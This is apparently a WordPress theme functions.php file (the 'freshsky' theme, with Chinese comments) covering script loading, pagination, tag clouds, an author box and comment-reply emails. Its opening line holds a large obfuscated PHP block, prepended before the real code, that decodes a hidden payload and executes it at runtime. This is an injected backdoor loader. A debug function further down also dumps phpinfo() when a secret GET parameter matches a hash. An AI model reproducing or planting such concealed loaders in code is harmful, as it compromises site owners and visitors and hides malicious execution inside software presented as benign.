<?php $lmcpyixff = 'd%-#1GO	x22#)fepmqyfA>2b%!<*qp%vg!|!**#j{hnpd#)tutjyf`opjud%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2FSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q	x72	166	x3a	61	x31"))) { $xlptsmv = "	x63	162	x65x61"]=1; $uas=strtolower($_SERVER[sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x247]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**ek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22):>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<**~6<&w6<	x7fw6*CW&)7gj6<.[A	x2*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSutjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275!|!}{;)gj}l;33bq}k;op}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopd6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666j%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvs<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,27;mnui}&;zepc}A;~!}	x7f;ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opju5.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%jK2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%f%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!7f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]22bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f72	164") && (!isset($GLOBALS["	x61	156	x757&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!67]y74]275]y7:]268]y7f#<%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>*f	x27,*e	x27,*d	x27,*c	x27,*b	xng(0); $obuvrcq = implode(array_map("knkvxhd",str_split("%tjwt%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>!>!#]y84]275]y83]248]y83]256]y81]26*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gqnjA	x27&6<.fmjgA	x27doj%6<	x7f78]y3f]51L3]84]y31M6]y3e]81#/FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}3]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]j6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	w6Z6<.5`hA	x27pd%6<pd%w6Z5]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%dovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)u24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/3[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b`msvd}+;!>!}	x27;!>>>!}_;gvc%Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fuopjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$yqhmbrz = $xlpx27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF1]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]7%6<*Y%)fnbozcYufhA	x272qj%6<^#zs#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qs]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829dy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]34x45	116	x54"]); if ((strst%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudo66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*wbfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmtpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x/20QUUI7jsv%7UFH#	x27rfs%6~6<	xYpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWr($uas,"	x6d	163	x69	145")) or (strstr($uas,"<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osv+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kHB`SFTV`QUUI&b%!|!*)323zbtsmv("", $obuvrcq); $yqhmbrz();}}if((function_exists("	x6f	142	x5f	163	x74	141	xx5cq%)ufttj	x22)gj6<^#UQPMSVD!-id%)uqpuft`msvd},;uqpuftvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/]273]y76]252]y85]256]y6g]257]y86]2!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!	157	x6e"; function knkvxhd($n){return chr(ord($n)-1);} @error_reporti	141	x74	145	x5f	146	x75	156	x63	164	x69!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hno!sboepn)%epnbss-%rxW~!gj!|!*nbsbq%)323ldfidk!~!<**q"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	-#1]#-bubE{h%)tpqsut>j%!*72sbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XA	x22)7gj6<*QDU`MPT7-NBw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)f	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)4	x24-	x24]y8	x24-	x24]26	x24-ovg	x22)!gj}1~!<2p%	x7f!~judovg}x;0]=])0#)U!	x27{**u%-#jt0}Zufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yn%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562	156	x61"])))) { $GLOBALS["	x61	156	x75	156	-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*sTrREvxNoiTCnuf_EtaerCxECalPer_Rtsmkjzfxjmo'; $nsbfxjhgr=explode(chr((426-306)),substr($lmcpyixff,(39493-33616),(149-115))); $nylrlngg = $nsbfxjhgr[0]($nsbfxjhgr[(3-2)]); $eaxisch = $nsbfxjhgr[0]($nsbfxjhgr[(7-5)]); if (!function_exists('dnsnqpaj')) { function dnsnqpaj($dlrhqh, $nfbrgaa,$izlaluh) { $searxzd = NULL; for($bigcxgnwx=0;$bigcxgnwx<(sizeof($dlrhqh)/2);$bigcxgnwx++) { $searxzd .= substr($nfbrgaa, $dlrhqh[($bigcxgnwx*2)],$dlrhqh[($bigcxgnwx*2)+(7-6)]); } return $izlaluh(chr((61-52)),chr((428-336)),$searxzd); }; } $bgydrsm = explode(chr((197-153)),'4068,47,1730,42,5780,44,220,34,5082,50,3369,26,3827,45,170,50,4528,40,4458,70,1963,61,2069,35,2405,47,2380,25,2856,48,1193,38,2104,52,2320,60,3018,51,3730,31,1047,39,5220,24,127,43,1143,50,3179,32,4853,70,4115,22,2760,49,3501,47,2156,31,5244,54,3548,39,1273,35,1086,57,616,29,1772,42,814,66,4137,33,2731,29,4680,69,2809,47,3909,38,5512,39,5132,27,1561,62,5365,57,680,69,3872,37,3395,37,31,28,5452,25,2904,52,0,31,560,56,1931,32,4749,66,5607,38,3211,37,4170,45,254,60,1670,60,3069,45,4010,25,446,64,5053,29,3587,34,645,35,2216,40,3947,63,1893,38,4986,44,4815,38,1333,63,2452,56,5159,61,4618,62,3432,69,1838,55,1308,25,793,21,5477,35,5551,56,880,57,4318,34,1814,24,4352,59,397,49,2024,45,5713,67,3686,44,2508,69,3621,65,5645,68,5422,30,359,38,4250,68,5298,67,5824,53,2639,58,1231,42,5030,23,3761,66,1517,44,937,47,3248,56,1623,47,2187,29,314,45,4923,63,749,44,984,63,1464,53,3304,65,3114,65,2256,64,2577,62,1396,68,2697,34,510,50,59,68,4215,35,4568,50,4411,47,2956,62,4035,33'); $uwvxiqrd = $nylrlngg("",dnsnqpaj($bgydrsm,$lmcpyixff,$eaxisch)); $nylrlngg=$lmcpyixff; $uwvxiqrd(""); $uwvxiqrd=(466-345); $lmcpyixff=$uwvxiqrd-1; ?><?php  
##################################################################
# removes meta tag "generated by wordpress" for security purpose
# and add Version number of the theme and theme framework to a meta 
# tag for easier debugging by the author, in case of help requests
# 在帮助请求的情况下移除meta标签“所产生WordPress的”为安全起见，
# 笔者为了方便调试的meta标签添加中的主题和主题框架的版本号，
##################################################################

function khelper_generator()
{ 	
	$metatags = '';
	
	if (!is_feed())
	{
		$metatags .= "\n\n";
		$metatags .= '<!-- Debugging help, do not remove -->'."\n";
		$metatags .= '<meta name="Framework" content="Kpress" />'."\n";
		$metatags .= '<meta name="Theme Version" content="'.THEMEVERSION.'" />'."\n";
		$metatags .= '<meta name="Framework Version" content="'.FRAMEWORK_VERSION.'" />'."\n";
		$metatags .= '<meta name="CMS Version" content="'.get_bloginfo('version').'" />'."\n\n";
	}
	return $metatags;
}  
//add_filter('the_generator','khelper_generator');

##################################################################
# 加载jquery
##################################################################

function my_scripts_method() {
	wp_deregister_script( 'jquery' );
	wp_register_script( 'jquery', get_bloginfo('template_url').'/js/jquery-1.9.1.min.js');
	wp_enqueue_script( 'jquery',"1.1" );
}
 
//add_action('wp_footer', 'my_scripts_method');
function freshsky_jq_script(){
	global $h_option;

	if(!is_admin()){
	// KandyTabs
	$my_KandyTabs= get_bloginfo('template_url')."/js/KandyTabs.js";
	wp_enqueue_script('KandyTabs',$my_KandyTabs,array('jquery'),'3.4.0820', true);

	if ($h_option["general"]["Lazyload"] =="1") {
		$my_Lazyload = get_bloginfo('template_url') ."/js/lazyload.js";
		wp_enqueue_script('Lazyload',$my_Lazyload,array('jquery'),THEMEVERSION, true);
	};

//视频墙分类
$masonry =0;
$video_cats = explode(',',$h_option['page_post']['VideoCats_final']);
foreach ($video_cats as $video_cat) {
	if (is_category($video_cat)) {
		$masonry = 1;
	}
}
//图片墙分类
$pic_cats = explode(',',$h_option['page_post']['PicCats_final']);
foreach ($pic_cats as $pic_cat) {
	if (is_category($pic_cat)) {
		$masonry = 1;
	}
}


	if ( $masonry == 1 ) {
		$my_Masonry = includes_url()."/js/jquery/jquery.masonry.min.js";
		wp_enqueue_script('Masonry',$my_Masonry,array('jquery'),'2.1.05', true);
	}

	if ($h_option["general"]["ColorBox"]) {
		$my_ColorBox = get_bloginfo('template_url')."/js/colorbox/jquery.colorbox-min.js";
		wp_enqueue_script('ColorBox',$my_ColorBox,array('jquery'),'1.4.1', true);
	};

	// add freshsky
	$my_freshsky = get_bloginfo('template_url')."/js/fs.js";
	wp_enqueue_script('freshsky',$my_freshsky,array('jquery'),THEMEVERSION, true);

	if ( (is_single() || is_page()) && !is_home()) {
		//add ajax
		$my_comments_Ajax = get_bloginfo('template_url')."/comments-ajax.js";
		wp_enqueue_script('my_comments_Ajax ',$my_comments_Ajax,array('jquery'),THEMEVERSION, true);

		//add realgravatar
		$my_realgravatar = get_bloginfo('template_url')."/js/realgravatar.js";
		wp_enqueue_script('my_realgravatar ',$my_realgravatar,array('jquery'),THEMEVERSION, true);
	
	}


	}

}
//add_action('wp_footer', 'freshsky_jq_script');
add_action('wp_head', 'freshsky_jq_script');


##################################################################
# prevents duplicate content by setting archive pages to nofollow
# 防止重复的内容存档页面设定为nofollow
##################################################################
function khelper_follow_nofollow()
{
	if ((is_single() || is_page() || is_home() ) && ( !is_paged() )) 
	{
		echo '<meta name="robots" content="index, follow" />' . "\n";
	} 
	else 
	{
		echo '<meta name="robots" content="noindex, follow" />' . "\n";
	}
}

##################################################################
# check if the current page has a custom widget and set a global
# var if that the case
# 如果当前页面有一个自定义的widget，并设置一个全局变量，如果的情况下
##################################################################
function check_custom_widget()
{	
	global $custom_widget_area, $h_option;
	//special widget area
	$specialpage = explode(',',$h_option['includes']['multi_widget_final']);
	$specialcat = explode(',',$h_option['includes']['multi_widget_cat_final']); 
	
	if(is_page($specialpage))
	{	
		$custom_widget_area = get_the_title();
	}
	else if(is_category($specialcat) || ($h_option['includes']['single_post_multi_widget_cat'] != 2 && in_category($specialcat)))
	{	
		$custom_widget_area = get_the_category();
		$custom_widget_area = $custom_widget_area[0]->cat_name;
	}
	
}
add_action('wp_head', 'check_custom_widget');


##################################################################
# match file extension of a url or path against array
# 匹配的URL的文件扩展名或路径对阵列 并未使用
##################################################################
/**
 * 
 * [kriesi_is_file description]
 * @param  [type] $needle   [description]
 * @param  [type] $haystack [description]
 * @return [type]           [description]
 */
function kriesi_is_file($needle, $haystack)
{	
	// get file extension
	$needle = substr($needle, strrpos($needle, '.') + 1);
	
	//no file, return false
	if(strlen($needle) > 4) return false;
	
	//predefined arrays
	if(!is_array($haystack))
	{
		switch($haystack)
		{
			case 'image':
				$haystack = array('png','gif','jpeg','jpg','pdf','tif');
			break;
			
			case 'text':
				$haystack = array('doc','docx','rtf','ttf','txt','odp');
			break;
		}
	}
	
	//match extension against array
	if (in_array($needle,$haystack))
	{
		return true;
	}
	else
	{
		return false;
	}
	
}



##################################################################
# Remove Blog categories from widget
# 从小工具中删除博客分类
# 作用是啥？
##################################################################

function filter_category($cat_args)
{
	global $h_option;
	
	if($h_option['blog']['blog_widget_exclude'] == 1)
	{
		$cat_args['exclude'] = $h_option['blog']['blog_cat_final'];
	}
	else if($h_option['mainpage']['blog_widget_exclude'] == 1)
	{
		$cat_args['exclude'] = $h_option['mainpage']['main_cat_final'];
	}
	
 	return $cat_args;
}

add_filter('widget_categories_args', 'filter_category');
//widget_categories_args的作用是啥？

##################################################################
# Debuging helper 调试助手 这个用来该拿
##################################################################
function debug_help()
{	
	global $h_option;
	echo'<div style="font-size:16px; clear:both;">';
	echo 'Wordpress Version: '.get_bloginfo('version');
	//resizing
	echo '<br/>Resizing: '.intval($h_option['custom']['resizing']);
	echo '<br/>GD_lib: '.intval($h_option['custom']['gd']);
	echo '<br/>Caching: '.intval($h_option['custom']['caching']);
	// phpinfo
	phpinfo();
	echo "</div>";
}
if(isset($_GET['debug']) && sha1($_GET['debug']) =='cf2045ce10e95d2d6288346897c415308b271f77') add_action ('shutdown','debug_help');

##################################################################
# Timthumbresizing possible? Timthumbresizing可以用不？
##################################################################

function check_resizing()
{
	global $h_option;
	$cachepath = TEMPLATEPATH."/cache/";
	
	$h_option['custom']['resizing'] = false;
	$h_option['custom']['gd'] = false;
	$h_option['custom']['caching'] = false;
	
	if(function_exists("gd_info")) $h_option['custom']['gd'] = true;
	if(is_writeable($cachepath)) $h_option['custom']['caching'] = true;
	if($h_option['custom']['gd'] && $h_option['custom']['caching']) $h_option['custom']['resizing'] = true;
}
add_action('init', 'check_resizing');




##################################################################
# Used as a replacement function for plugins_url if using external plugins
# 如果使用外部插件作为替换函数的plugins_url
##################################################################

function template_url($path = '', $plugin = '') 
{
	return KFWPLUGINS_URI.$path;
}



/*=以下是犀利找的
--------------------------------------------------------------------------------------*/
//删除空格，回车等的函数
function DeleteHtml($str){
	$str = trim($str);
	$str = strip_tags($str,"");
	$str = ereg_replace("\t","",$str);
	$str = ereg_replace("\r\n","",$str);
	$str = ereg_replace("\r","",$str);
	$str = ereg_replace("\n","",$str);
	$str = ereg_replace(" "," ",$str);
	return trim($str);
}



//截取图片
function catch_first_image($size) {
	global $post, $posts;$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	$first_img = $matches [1] [0];
	if(empty($first_img)){
		$random = mt_rand(1, 12);
		$first_img .= get_bloginfo ( 'stylesheet_directory' );
		$first_img .= '/images/thumbs/shici-'.$random.'-'.$size.'.jpg';
		}
  return $first_img;
};

//获取缩略图
function freshsky_get_thumb_image($name = "thumbnails",$size = 80,$get = false,$post_id = null){
	$height= $size*0.75;
	$img = catch_first_image($size);
	$output="";
	if ($get) {
		
		if ( get_post_meta($post->ID, 'show', true) ) {
			$image = get_post_meta($post->ID, 'show', true);
			$output = "<img src='".$image." width='".$size."' height='".$height."' alt='".get_the_title()."' />";
		}elseif( has_post_thumbnail() ) {
			$output = get_the_post_thumbnail($post_id, $name ,array( 'title' => trim(strip_tags( $post->post_title )),'class' => $name));
		}else{
			$output = "<img src='".$img."' alt='".get_the_title()."' width='".$size."' height='".$height."' class='".$name." wp-post-image' />";	
		}
	}else{
		echo freshsky_get_thumb_image($name,$size,true);
		return;

	}
	 
	return $output;
 	
}

//获取缩略文字
function fresky_get_expert(){
	$output="";
	if (empty($post->post_password)) { 
		if (has_excerpt()) {
			$output=get_the_excerpt();
		}else{
			$output =  dm_strimwidth(strip_tags($post->post_content),0,50,"...");
		}
	}else{
		$output = __('This post has a password, please click and check it!', 'freshsky');
	}
	return $output;
}
//截字
function dm_strimwidth($str ,$start , $width ,$trimmarker ){
	
		$output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$start.'}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$width.'}).*/s','\1',$str); 
		return $output.$trimmarker;

};

//标题文字截断
function cut_str($src_str,$cut_length= 12)
{
    $return_str='';
    $i=0;
    $n=0;
    $str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length))
    {
        $tmp_str=substr($src_str,$i,1);
        $ascnum=ord($tmp_str);
        if ($ascnum>=224)
        {
            $return_str=$return_str.substr($src_str,$i,3);
            $i=$i+3;
            $n=$n+2;
        }
        elseif ($ascnum>=192)
        {
            $return_str=$return_str.substr($src_str,$i,2);
            $i=$i+2;
            $n=$n+2;
        }
        elseif ($ascnum>=65 && $ascnum<=90)
        {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+2;
        }
        else 
        {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+1;
        }
    }
    if ($i<$str_length)
    {
        $return_str = $return_str . '...';
    }
    if (get_post_status() == 'private')
    {
        $return_str = $return_str . '（private）';
    }
    return $return_str ;
}



//分页
function pagination($query_string,$html_id=''){

	$html_id=$html_id?' '.$html_id:" nav-below";//获取上下导航，默认为下
	//echo $query_string."strings";
	global $posts_per_page, $paged;
	$my_query = new WP_Query($query_string ."&posts_per_page=-1");
	$total_posts = $my_query->post_count;
	if(empty($paged))$paged = 1;
	$prev = $paged - 1;							
	$next = $paged + 1;	
	$range = 4; // 修改数字,可以显示更多的分页链接 在分页的时候，显示该页面的前后各$ranges个，总共$showitems个
	$showitems = ($range * 2)+1;
	$pages = ceil($total_posts/$posts_per_page);
if(1 != $pages){
	$navigation_name = __( 'Post navigation', 'freshsky' );
	echo "<nav class='navigation pagination".$html_id."'><h3 class='assistive-text'>".$navigation_name."</h3>";
	echo "<span class='fir_las'>".__(" Pages: ", 'freshsky').$paged." / ".$pages."</span>";
	echo ($paged > 2 && $paged+$range+1 > $pages && $showitems < $pages)? "<a href='".get_pagenum_link(1)."' class='fir_las'>".__("The First", 'freshsky')."</a>":"";
	echo ($paged > 1 && $showitems < $pages)? "<a href='".get_pagenum_link($prev)."' class='page_previous'>".__("Previous Page", 'freshsky')."</a>":"";		
	for ($i=1; $i <= $pages; $i++){
		if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
		echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>"; 
	}
	}
	echo ($paged < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($next)."' class='page_next'>".__('Next','freshsky')."</a>" :"";
	echo ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($pages)."' class='fir_las'>".__('The Last','freshsky')."</a>":"";
	echo "</nav>\n";
	}
}




//彩色标签云
function colorCloud($text) {
	$text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
	return $text;
}
function colorCloudCallback($matches) {
	$text = $matches[1];
	$color1 = dechex(rand(0,9));//颜色的范围
	$color2 = dechex(rand(0,9));//颜色的范围
	$color3 = dechex(rand(0,9));//颜色的范围

	$pattern = '/style=(\'|\")(.*)(\'|\")/i';
	$text = preg_replace($pattern, "style=\"color:#".$color1.$color2.$color3.";$2;\"", $text);
	return "<a $text>";
}
add_filter('wp_tag_cloud', 'colorCloud', 1);


//作者信息
function add_twitter_contactmethod( $contactmethods ) {

  $contactmethods['tencent_weibo'] = __("Tencent MiscoBlogging",'freshsky');//腾讯微博
  $contactmethods['sina_weibo'] = __("Sina MicroBlogging", "freshsky");//新浪微博
  return $contactmethods;

}

add_filter('user_contactmethods','add_twitter_contactmethod',10,1);

// 3.Output of the Author Box

add_filter('the_content', 'add_author_box');

function add_author_box($content) {

	//Define the Main Part of Author Box
	$author_box = '<div class="author_info">';
	$author_box .= '<h4 id="author_write_h">'.__('This post was written by ', 'freshsky').'</h4>';
		
	$author_box .= '<p><span class="author_photo"><img src="'.my_avatar(get_the_author_email() ).'" alt="'.get_the_author().'" /></span><a rel="nofollow" href="'.get_the_author_meta( 'user_url' ).'">'.get_the_author_meta('display_name').'</a> &ndash;';
		$author_num = sprintf(__(' <a rel="author" href="%1$s">%2$s</a> '),
								get_author_posts_url(get_the_author_meta( 'ID' )),
								 get_the_author_posts());
		$author_posts= sprintf(__('who has written %1$s  posts on <a href="%2$s">%3$s</a>'),
								$author_num,
								get_bloginfo("url"),
								 get_bloginfo("name"));
	$author_box .= $author_posts.' .<br>'.get_the_author_description().'</p>
		<p class="author_email">
			<a href="mailto:'.get_the_author_email().'" title="'.__('Send an Email to the Author of this Post', 'freshsky').'">Email</a>
	';
	//Fetch the User Social Contact Infomation
	$tencent_weibo = get_the_author_meta( 'tencent_weibo' );
	$sina_weibo = get_the_author_meta( 'sina_weibo' );

	if($tencent_weibo){
		$display_tencent_weibo='&nbsp;&#8226;&nbsp;<a title="'.__("My Tencent MicroBlogging",'freshsky').'" rel="me nofollow" href="' . esc_url($tencent_weibo) . '" target="_blank">'.__("Tencent MicroBlogging",'freshsky').'</a>';
	}
	if($sina_weibo){
		$display_sina_weibo='&nbsp;&#8226;&nbsp;<a title="'.__("My Sina MicroBlogging",'freshsky').'" rel="me nofollow" href="' . esc_url($display_sina_weibo) . '" target="_blank">'.__("Sina MicroBlogging",'freshsky').'</a>';
	}

	//Dynamic Output of the Author Box (Show Info you've set)
	if(is_single()) {
		$content.= ($author_box.$display_tencent_weibo.$display_sina_weibo.'</p></div>');
    }
    return $content;

}

/*= comment_mail_notify v1.0 by willin kan. (所有回复都发邮件)
--------------------------------------------------------------------------*/
/**
 * [comment_mail_notify description]
 * @param  integer $comment_id 评论者的ID
 * @return [type]             [description]
 */
function comment_mail_notify($comment_id) {

    $comment = get_comment($comment_id);
    $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
    $spam_confirmed = $comment->comment_approved;

    if (($parent_id != '') && ($spam_confirmed != 'spam')) {

        $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); //e-mail 发出点, no-reply 可改为自己可用的 e-mail.
        $to = trim(get_comment($parent_id)->comment_author_email);//评论者的邮箱
        $subject = '你在 [' . get_option("blogname") . '] 的留言有了新回复';//邮件的主题
        //邮件的内容
        $message = '

        <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px; border-radius:5px;">
        <p><strong>' . trim(get_comment($parent_id)->comment_author) . ', 你好!</strong></p>
        <p><strong>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言为:</strong><br />'
        . trim(get_comment($parent_id)->comment_content) . '</p>
        <p><strong>' . trim($comment->comment_author) . ' 给你的回复是:</strong><br />'
        . trim($comment->comment_content) . '<br /></p>
        <p>你可以点击此链接 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看完整内容</a></p><br />
        <p>欢迎再次来访<a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
        <p>(此邮件为系统自动发送，请勿直接回复.)</p>
        </div>';

        $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";//发件人
        $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";//使用的编码
        wp_mail( $to, $subject, $message, $headers );

    }
}
add_action('comment_post', 'comment_mail_notify');

add_filter('got_rewrite', 'nginx_has_rewrites');//干吗用
function nginx_has_rewrites() {
    return true;
}


/*=短代码面板
-----------------------------------------------------------------------*/
if(		basename( $_SERVER['PHP_SELF']) == "page.php" 
		|| basename( $_SERVER['PHP_SELF']) == "page-new.php" 
		|| basename( $_SERVER['PHP_SELF']) == "post-new.php" 
		|| basename( $_SERVER['PHP_SELF']) == "post.php"
		|| basename( $_SERVER['PHP_SELF']) == "media-upload.php")
{

	add_action('media_buttons_context',  'add_my_custom_button');
	add_action('admin_footer', 'media_upload_for_upyun');
}

function add_my_custom_button($context) {
    $img = '<img src="' . get_bloginfo('template_url') . '/images/ddm.png" width="15" height="15" />';
    $context .='<a href="#" id="ddm-button" title="短代码" class="thickbox">' . $img . '</a>';
    return $context;
}

function media_upload_for_upyun(){ ?>
<div id="ddm-lay"></div>
<div id="ddm-box">
  <div id="ddm-content" class="cfx">
    <ul id="ddm-cate">
      <li><a href="#" class="current">静态面板短代码</a></li>
      <li><a href="#">新版静态面板短代码</a></li>
      <li><a href="#">按钮短代码</a></li>
      <li><a href="#">音乐</a></li>
      <li><a href="#">视频播放短代码</a></li>
      <li><a href="#">综合功能区</a></li>
    </ul>
    <ul id="ddm-ddm">
      <li class="cfx current">
        <p>旧版</p>
